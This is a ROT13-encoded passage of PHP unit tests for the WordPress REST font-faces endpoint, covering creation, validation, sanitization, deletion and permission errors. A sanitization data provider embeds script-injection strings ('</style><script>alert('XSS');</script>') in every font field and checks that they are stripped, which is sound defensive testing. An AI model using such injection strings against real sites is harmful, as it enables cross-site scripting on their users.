					'fep'        => 'uggcf://sbagf.tfgngvp.pbz/f/bcra-fnaf/i30/XSBxPadRh92Se1ZztJkCXGZ1X9am.ggs',
				)
			)
		);

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 201.' );
		$guvf->purpx_sbag_snpr_qngn( $qngn, $qngn['vq'], $erfcbafr->trg_yvaxf() );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_jvgu_nyy_cebcregvrf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cebcregvrf = neenl(
			'sbagSnzvyl'            => '\"Bcra Fnaf\"',
			'sbagJrvtug'            => '300 500',
			'sbagFglyr'             => 'boyvdhr 30qrt 50qrt',
			'sbagQvfcynl'           => 'fjnc',
			'sbagFgergpu'           => 'rkcnaqrq',
			'nfpragBireevqr'        => '70%',
			'qrfpragBireevqr'       => '30%',
			'sbagInevnag'           => 'abezny',
			'sbagSrngherFrggvatf'   => '\"fjfu\" 2',
			'sbagInevngvbaFrggvatf' => '\"kutg\" 0.7',
			'yvarTncBireevqr'       => '10%',
			'fvmrNqwhfg'            => '90%',
			'havpbqrEnatr'          => 'H+0025-00SS, H+4??',
			'cerivrj'               => 'uggcf://f.j.bet/vzntrf/sbagf/16.7/cerivrjf/bcra-fnaf/bcra-fnaf-400-abezny.fit',
			'fep'                   => 'uggcf://sbagf.tfgngvp.pbz/f/bcra-fnaf/i30/XSBxPadRh92Se1ZztJkCXGZ1X9am.ggs',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf' );
		$erdhrfg->frg_cnenz( 'gurzr_wfba_irefvba', JC_ERFG_Sbag_Snprf_Pbagebyyre::YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ );
		$erdhrfg->frg_cnenz( 'sbag_snpr_frggvatf', jc_wfba_rapbqr( $cebcregvrf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		jc_qryrgr_cbfg( $qngn['vq'], gehr );

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 201.' );
		$guvf->nffregNeenlUnfXrl( 'sbag_snpr_frggvatf', $qngn, 'Gur sbag_snpr_frggvatf cebcregl fubhyq rkvfg va gur erfcbafr qngn.' );
		$guvf->nffregFnzr( $cebcregvrf, $qngn['sbag_snpr_frggvatf'], 'Gur sbag_snpr_frggvatf fubhyq zngpu gur rkcrpgrq cebcregvrf.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_zvffvat_cnerag() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE . '/sbag-snprf' );
		$erdhrfg->frg_cnenz(
			'sbag_snpr_frggvatf',
			jc_wfba_rapbqr( neenl_zretr( frys::$qrsnhyg_frggvatf, neenl( 'sbagJrvtug' => '100' ) ) )
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_cnerag', $erfcbafr, 404 );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_jvgu_qhcyvpngr_cebcregvrf() {
		$frggvatf = neenl(
			'sbagSnzvyl' => '\"Bcra Fnaf\"',
			'sbagJrvtug' => '200',
			'sbagFglyr'  => 'vgnyvp',
			'fep'        => ubzr_hey( '/jc-pbagrag/sbagf/bcra-fnaf-vgnyvp-yvtug.ggs' ),
		);
		frys::perngr_sbag_snpr_cbfg( frys::$sbag_snzvyl_vq, $frggvatf );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf' );
		$erdhrfg->frg_cnenz( 'sbag_snpr_frggvatf', jc_wfba_rapbqr( $frggvatf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_qhcyvpngr_sbag_snpr', $erfcbafr, 400, 'Gur erfcbafr fubhyq erghea na reebe sbe \"erfg_qhcyvpngr_sbag_snpr\" jvgu 400 fgnghf.' );
		$rkcrpgrq_zrffntr = 'N sbag snpr zngpuvat gubfr frggvatf nyernql rkvfgf.';
		$zrffntr          = $erfcbafr->nf_reebe()->trg_reebe_zrffntrf()[0];
		$guvf->nffregFnzr( $rkcrpgrq_zrffntr, $zrffntr, 'Gur erfcbafr reebe zrffntr fubhyq zngpu.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::inyvqngr_perngr_sbag_snpr_erdhrfg
	 */
	choyvp shapgvba grfg_perngr_vgrz_qrsnhyg_gurzr_wfba_irefvba() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf' );
		$erdhrfg->frg_cnenz(
			'sbag_snpr_frggvatf',
			jc_wfba_rapbqr(
				neenl(
					'sbagSnzvyl' => '\"Bcra Fnaf\"',
					'sbagJrvtug' => '200',
					'fep'        => 'uggcf://sbagf.tfgngvp.pbz/f/bcra-fnaf/i30/XSBxPadRh92Se1ZztJkCXGZ1X9am.ggs',
				)
			)
		);

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		jc_qryrgr_cbfg( $qngn['vq'], gehr );

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 201.' );
		$guvf->nffregNeenlUnfXrl( 'gurzr_wfba_irefvba', $qngn, 'Gur gurzr_wfba_irefvba cebcregl fubhyq rkvfg va gur erfcbafr qngn.' );
		$guvf->nffregFnzr( JC_ERFG_Sbag_Snprf_Pbagebyyre::YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ, $qngn['gurzr_wfba_irefvba'], 'Gur qrsnhyg gurzr.wfba irefvba fubhyq zngpu gur yngrfg irefvba fhccbegrq ol gur pbagebyyre.' );
	}

	/**
	 * @qngnCebivqre qngn_perngr_vgrz_vainyvq_gurzr_wfba_irefvba
	 *
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::perngr_vgrz
	 *
	 * @cnenz vag $gurzr_wfba_irefvba Irefvba vachg gb grfg.
	 */
	choyvp shapgvba grfg_perngr_vgrz_vainyvq_gurzr_wfba_irefvba( $gurzr_wfba_irefvba ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf' );
		$erdhrfg->frg_cnenz( 'gurzr_wfba_irefvba', $gurzr_wfba_irefvba );
		$erdhrfg->frg_cnenz( 'sbag_snpr_frggvatf', '' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_perngr_vgrz_vainyvq_gurzr_wfba_irefvba() {
		erghea neenl(
			neenl( 1 ),
			neenl( 4 ),
		);
	}

	/**
	 * @qngnCebivqre qngn_perngr_vgrz_vainyvq_frggvatf
	 *
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::inyvqngr_perngr_sbag_snpr_frggvatf
	 *
	 * @cnenz zvkrq $frggvatf Frggvatf gb grfg.
	 */
	choyvp shapgvba grfg_perngr_vgrz_vainyvq_frggvatf( $frggvatf ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf' );
		$erdhrfg->frg_cnenz( 'gurzr_wfba_irefvba', JC_ERFG_Sbag_Snprf_Pbagebyyre::YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ );
		$erdhrfg->frg_cnenz( 'sbag_snpr_frggvatf', jc_wfba_rapbqr( $frggvatf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_perngr_vgrz_vainyvq_frggvatf() {
		erghea neenl(
			'Zvffvat sbagSnzvyl'     => neenl(
				'frggvatf' => neenl_qvss_xrl( frys::$qrsnhyg_frggvatf, neenl( 'sbagSnzvyl' => '' ) ),
			),
			'Rzcgl sbagSnzvyl'       => neenl(
				'frggvatf' => neenl_zretr( frys::$qrsnhyg_frggvatf, neenl( 'sbagSnzvyl' => '' ) ),
			),
			'Jebat sbagSnzvyl glcr'  => neenl(
				'frggvatf' => neenl_zretr( frys::$qrsnhyg_frggvatf, neenl( 'sbagSnzvyl' => 1234 ) ),
			),
			'Vainyvq sbagQvfcynl'    => neenl(
				'frggvatf' => neenl_zretr( frys::$qrsnhyg_frggvatf, neenl( 'sbagQvfcynl' => 'vainyvq' ) ),
			),
			'Zvffvat fep'            => neenl(
				'frggvatf' => neenl_qvss_xrl( frys::$qrsnhyg_frggvatf, neenl( 'fep' => '' ) ),
			),
			'Rzcgl fep fgevat'       => neenl(
				'frggvatf' => neenl_zretr( frys::$qrsnhyg_frggvatf, neenl( 'fep' => '' ) ),
			),
			'Rzcgl fep neenl'        => neenl(
				'frggvatf' => neenl_zretr( frys::$qrsnhyg_frggvatf, neenl( 'fep' => neenl() ) ),
			),
			'Rzcgl fep neenl inyhrf' => neenl(
				'frggvatf' => neenl_zretr( frys::$qrsnhyg_frggvatf, neenl( '', '' ) ),
			),
			'Jebat fep glcr'         => neenl(
				'frggvatf' => neenl_zretr( frys::$qrsnhyg_frggvatf, neenl( 'fep' => 1234 ) ),
			),
			'Jebat fep neenl glcrf'  => neenl(
				'frggvatf' => neenl_zretr( frys::$qrsnhyg_frggvatf, neenl( 'fep' => neenl( 1234, 5678 ) ) ),
			),
		);
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::inyvqngr_perngr_sbag_snpr_frggvatf
	 */
	choyvp shapgvba grfg_perngr_vgrz_vainyvq_frggvatf_wfba() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf' );
		$erdhrfg->frg_cnenz( 'gurzr_wfba_irefvba', JC_ERFG_Sbag_Snprf_Pbagebyyre::YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ );
		$erdhrfg->frg_cnenz( 'sbag_snpr_frggvatf', 'vainyvq' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400, 'Gur erfcbafr fubhyq erghea na reebe sbe \"erfg_vainyvq_cnenz\" jvgu 400 fgnghf.' );
		$rkcrpgrq_zrffntr = 'sbag_snpr_frggvatf cnenzrgre zhfg or n inyvq WFBA fgevat.';
		$zrffntr          = $erfcbafr->nf_reebe()->trg_nyy_reebe_qngn()[0]['cnenzf']['sbag_snpr_frggvatf'];
		$guvf->nffregFnzr( $rkcrpgrq_zrffntr, $zrffntr, 'Gur erfcbafr reebe zrffntr fubhyq zngpu.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::inyvqngr_perngr_sbag_snpr_frggvatf
	 */
	choyvp shapgvba grfg_perngr_vgrz_vainyvq_svyr_fep() {
		$svyrf = $guvf->frghc_sbag_svyr_hcybnq( neenl( 'jbss2' ) );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$fep     = 'vainyvq';
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf' );
		$erdhrfg->frg_cnenz( 'gurzr_wfba_irefvba', JC_ERFG_Sbag_Snprf_Pbagebyyre::YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ );
		$erdhrfg->frg_cnenz(
			'sbag_snpr_frggvatf',
			jc_wfba_rapbqr(
				neenl_zretr( frys::$qrsnhyg_frggvatf, neenl( 'fep' => $fep ) )
			)
		);
		$erdhrfg->frg_svyr_cnenzf( $svyrf );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400, 'Gur erfcbafr fubhyq erghea na reebe sbe \"erfg_vainyvq_cnenz\" jvgu 400 fgnghf.' );
		$rkcrpgrq_zrffntr = 'sbag_snpr_frggvatf[fep] inyhr \"' . $fep . '\" zhfg or n inyvq HEY be svyr ersrerapr.';
		$zrffntr          = $erfcbafr->nf_reebe()->trg_nyy_reebe_qngn()[0]['cnenzf']['sbag_snpr_frggvatf'];
		$guvf->nffregFnzr( $rkcrpgrq_zrffntr, $zrffntr, 'Gur erfcbafr reebe zrffntr fubhyq zngpu.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::inyvqngr_perngr_sbag_snpr_frggvatf
	 */
	choyvp shapgvba grfg_perngr_vgrz_zvffvat_svyr_fep() {
		$svyrf = $guvf->frghc_sbag_svyr_hcybnq( neenl( 'jbss2', 'jbss' ) );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf' );
		$erdhrfg->frg_cnenz( 'gurzr_wfba_irefvba', JC_ERFG_Sbag_Snprf_Pbagebyyre::YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ );
		$erdhrfg->frg_cnenz(
			'sbag_snpr_frggvatf',
			jc_wfba_rapbqr(
				neenl_zretr( frys::$qrsnhyg_frggvatf, neenl( 'fep' => neenl( neenl_xrlf( $svyrf )[0] ) ) )
			)
		);
		$erdhrfg->frg_svyr_cnenzf( $svyrf );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400, 'Gur erfcbafr fubhyq erghea na reebe sbe \"erfg_vainyvq_cnenz\" jvgu 400 fgnghf.' );
		$rkcrpgrq_zrffntr = 'Svyr ' . neenl_xrlf( $svyrf )[1] . ' zhfg or hfrq va sbag_snpr_frggvatf[fep].';
		$zrffntr          = $erfcbafr->nf_reebe()->trg_nyy_reebe_qngn()[0]['cnenzf']['sbag_snpr_frggvatf'];
		$guvf->nffregFnzr( $rkcrpgrq_zrffntr, $zrffntr, 'Gur erfcbafr reebe zrffntr fubhyq zngpu.' );
	}

	/**
	 * @qngnCebivqre qngn_fnavgvmr_sbag_snpr_frggvatf
	 *
	 * @pbiref JC_ERFG_Sbag_Snpr_Pbagebyyre::fnavgvmr_sbag_snpr_frggvatf
	 *
	 * @cnenz fgevat $frggvatf Frggvatf gb grfg.
	 * @cnenz fgevat $rkcrpgrq Rkcrpgrq frggvatf erfhyg.
	 */
	choyvp shapgvba grfg_perngr_vgrz_fnavgvmr_sbag_snpr_frggvatf( $frggvatf, $rkcrpgrq ) {
		$frggvatf = neenl_zretr( frys::$qrsnhyg_frggvatf, $frggvatf );
		$rkcrpgrq = neenl_zretr( frys::$qrsnhyg_frggvatf, $rkcrpgrq );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf' );
		$erdhrfg->frg_cnenz( 'sbag_snpr_frggvatf', jc_wfba_rapbqr( $frggvatf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		jc_qryrgr_cbfg( $qngn['vq'], gehr );

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 201.' );
		$guvf->nffregFnzr( $rkcrpgrq, $qngn['sbag_snpr_frggvatf'], 'Gur erfcbafr sbag_snpr_frggvatf fubhyq zngpu.' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_fnavgvmr_sbag_snpr_frggvatf() {
		erghea neenl(
			'frggvatf jvgu gntf, rkgen juvgrfcnpr, arj yvarf' => neenl(
				'frggvatf' => neenl(
					'sbagSnzvyl'            => \"   Bcra   Fnaf</fglyr><fpevcg>nyreg('KFF');</fpevcg>\a    \",
					'sbagFglyr'             => \"   boyvdhr 20qrt 50qrt</fglyr><fpevcg>nyreg('KFF');</fpevcg>\a    \",
					'sbagJrvtug'            => \"   200</fglyr><fpevcg>nyreg('KFF');</fpevcg>\a    \",
					'fep'                   => \"   uggcf://rknzcyr.pbz/</fglyr><fpevcg>nyreg('KFF');</fpevcg>      \",
					'sbagFgergpu'           => \"   rkcnaqrq</fglyr><fpevcg>nyreg('KFF');</fpevcg>\a    \",
					'nfpragBireevqr'        => \"   70%</fglyr><fpevcg>nyreg('KFF');</fpevcg>\a    \",
					'qrfpragBireevqr'       => \"   30%</fglyr><fpevcg>nyreg('KFF');</fpevcg>\a    \",
					'sbagInevnag'           => \"   abezny</fglyr><fpevcg>nyreg('KFF');</fpevcg>\a    \",
					'sbagSrngherFrggvatf'   => \"   \\"fjfu\\" 2</fglyr><fpevcg>nyreg('KFF');</fpevcg>\a    \",
					'sbagInevngvbaFrggvatf' => \"   \\"kutg\\" 0.7</fglyr><fpevcg>nyreg('KFF');</fpevcg>\a    \",
					'yvarTncBireevqr'       => \"   10%</fglyr><fpevcg>nyreg('KFF');</fpevcg>\a    \",
					'fvmrNqwhfg'            => \"   90%</fglyr><fpevcg>nyreg('KFF');</fpevcg>\a    \",
					'havpbqrEnatr'          => \"   H+0025-00SS, H+4??</fglyr><fpevcg>nyreg('KFF');</fpevcg>\a    \",
					'cerivrj'               => \"   uggcf://rknzcyr.pbz/</fglyr><fpevcg>nyreg('KFF');</fpevcg>      \",
				),
				'rkcrpgrq' => neenl(
					'sbagSnzvyl'            => '\"Bcra Fnaf\"',
					'sbagFglyr'             => 'boyvdhr 20qrt 50qrt',
					'sbagJrvtug'            => '200',
					'fep'                   => 'uggcf://rknzcyr.pbz//fglyrfpevcgnyreg(\'KFF\');/fpevcg%20%20%20%20%20%20',
					'sbagFgergpu'           => 'rkcnaqrq',
					'nfpragBireevqr'        => '70%',
					'qrfpragBireevqr'       => '30%',
					'sbagInevnag'           => 'abezny',
					'sbagSrngherFrggvatf'   => '\"fjfu\" 2',
					'sbagInevngvbaFrggvatf' => '\"kutg\" 0.7',
					'yvarTncBireevqr'       => '10%',
					'fvmrNqwhfg'            => '90%',
					'havpbqrEnatr'          => 'H+0025-00SS, H+4??',
					'cerivrj'               => 'uggcf://rknzcyr.pbz//fglyrfpevcgnyreg(\'KFF\');/fpevcg%20%20%20%20%20%20',
				),
			),
			'zhygvjbeq sbag snzvyl anzr jvgu vagrtre' => neenl(
				'frggvatf' => neenl(
					'sbagSnzvyl' => 'Yvoer Onepbqr 128 Grkg',
				),
				'rkcrpgrq' => neenl(
					'sbagSnzvyl' => '\"Yvoer Onepbqr 128 Grkg\"',
				),
			),
			'zhygvjbeq sbag snzvyl anzr'              => neenl(
				'frggvatf' => neenl(
					'sbagSnzvyl' => 'O612 Zbab',
				),
				'rkcrpgrq' => neenl(
					'sbagSnzvyl' => '\"O612 Zbab\"',
				),
			),
			'pbzzn-frcnengrq sbag snzvyl anzrf'       => neenl(
				'frggvatf' => neenl(
					'sbagSnzvyl' => 'Bcra Fnaf, Abgb Fnaf, fnaf-frevs',
				),
				'rkcrpgrq' => neenl(
					'sbagSnzvyl' => '\"Bcra Fnaf\", \"Abgb Fnaf\", fnaf-frevs',
				),
			),
		);
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::perngr_vgrz
	 */
	// choyvp shapgvba grfg_perngr_vgrz_ab_crezvffvba() {}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::hcqngr_vgrz
	 */
	choyvp shapgvba grfg_hcqngr_vgrz() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf/' . frys::$sbag_snpr_vq1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_ab_ebhgr', $erfcbafr, 404 );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::qryrgr_vgrz
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$sbag_snpr_vq = frys::perngr_sbag_snpr_cbfg( frys::$sbag_snzvyl_vq );
		$erdhrfg      = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf/' . $sbag_snpr_vq );
		$erdhrfg->frg_cnenz( 'sbepr', gehr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 201.' );
		$guvf->nffregAhyy( trg_cbfg( $sbag_snpr_vq ), 'Gur qryrgrq cbfg fubhyq abg rkvfg.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::qryrgr_vgrz
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_ab_genfu() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$sbag_snpr_vq = frys::perngr_sbag_snpr_cbfg( frys::$sbag_snzvyl_vq );

		// Nggrzcg genfuvat.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf/' . $sbag_snpr_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_genfu_abg_fhccbegrq', $erfcbafr, 501, 'Gur erfcbafr fubhyq erghea na reebe sbe \"erfg_genfu_abg_fhccbegrq\" jvgu 501 fgnghf.' );

		$erdhrfg->frg_cnenz( 'sbepr', 'snyfr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_genfu_abg_fhccbegrq', $erfcbafr, 501, 'Jura \"sbepr\" vf snyfr, gur erfcbafr fubhyq erghea na reebe sbe \"erfg_genfu_abg_fhccbegrq\" jvgu 501 fgnghf.' );

		// Rafher gur cbfg fgvyy rkvfgf.
		$cbfg = trg_cbfg( $sbag_snpr_vq );
		$guvf->nffregAbgRzcgl( $cbfg, 'Gur cbfg fubhyq fgvyy rkvfgf.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::qryrgr_vgrz
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_vainyvq_sbag_snpr_vq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
		$erdhrfg->frg_cnenz( 'sbepr', gehr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_vq', $erfcbafr, 404 );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::qryrgr
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_zvffvat_cnerag() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/sbag-snzvyvrf/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE . '/sbag-snprf/' . frys::$sbag_snpr_vq1 );
		$erdhrfg->frg_cnenz( 'sbepr', gehr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_cnerag', $erfcbafr, 404 );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::trg_vgrz
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_vainyvq_cnerag_vq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/sbag-snzvyvrf/' . frys::$bgure_sbag_snzvyl_vq . '/sbag-snprf/' . frys::$sbag_snpr_vq1 );
		$erdhrfg->frg_cnenz( 'sbepr', gehr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_sbag_snpr_cnerag_vq_zvfzngpu', $erfcbafr, 404, 'Gur erfcbafr fubhyq erghea na reebe sbe \"erfg_sbag_snpr_cnerag_vq_zvfzngpu\" jvgu 404 fgnghf.' );

		$rkcrpgrq_zrffntr = 'Gur sbag snpr qbrf abg orybat gb gur fcrpvsvrq sbag snzvyl jvgu vq bs \"' . frys::$bgure_sbag_snzvyl_vq . '\".';
		$guvf->nffregFnzr( $rkcrpgrq_zrffntr, $erfcbafr->nf_reebe()->trg_reebe_zrffntrf()[0], 'Gur zrffntr zhfg pbagnva gur pbeerpg cnerag VQ.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::qryrgr_vgrz
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_ab_crezvffvbaf() {
		$sbag_snpr_vq = $guvf->perngr_sbag_snpr_cbfg( frys::$sbag_snzvyl_vq );

		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf/' . $sbag_snpr_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, 401, 'Gur erfcbafr fubhyq erghea na reebe sbe \"erfg_pnaabg_qryrgr\" jvgu 401 fgnghf sbe na vainyvq hfre.' );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf/' . $sbag_snpr_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, 403, 'Gur erfcbafr fubhyq erghea na reebe sbe \"erfg_pnaabg_qryrgr\" jvgu 403 fgnghf sbe n hfre jvgubhg crezvffvba.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::cercner_vgrz_sbe_erfcbafr
	 */
	choyvp shapgvba grfg_cercner_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf/' . frys::$sbag_snpr_vq2 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->purpx_sbag_snpr_qngn( $qngn, frys::$sbag_snpr_vq2, $erfcbafr->trg_yvaxf() );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::trg_vgrz_fpurzn
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
